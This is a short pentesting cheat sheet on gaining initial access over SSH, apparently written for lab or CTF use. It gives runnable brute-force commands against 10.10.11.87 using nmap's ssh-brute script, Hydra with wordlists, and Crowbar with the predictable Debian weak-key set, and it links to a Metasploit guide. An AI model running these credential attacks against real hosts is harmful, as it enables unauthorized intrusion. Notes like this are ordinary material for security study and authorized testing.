# Initial Access

## SSH

### NMAP NSE Brute for SSH


sudo nmap 10.10.11.87 --script ssh-brute.nse

### Dictionary attack with Hydra

hydra ssh://10.10.11.87 -L usernames.txt -P passwords.txt

### Brute Force attack with MSF

https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d

### Brute Force with Predictable Private/Public Key

"On the Linux platform, the default maximum process ID is 32,768, resulting in a very small number of seed values being used for all PRNG operations."

Download the predicatable Pub/Priv keys from: https://github.com/g0tmi1k/debian-ssh/blob/master/README.md

Crowbar usage: 

Syntax: crowbar -b sshkey -s <TARGET_IP> -u <username> -k <path/to/private/key>

crowbar -b sshkey -s 10.10.11.87 -u root -k /home/user1/Downloads/dsa/1024

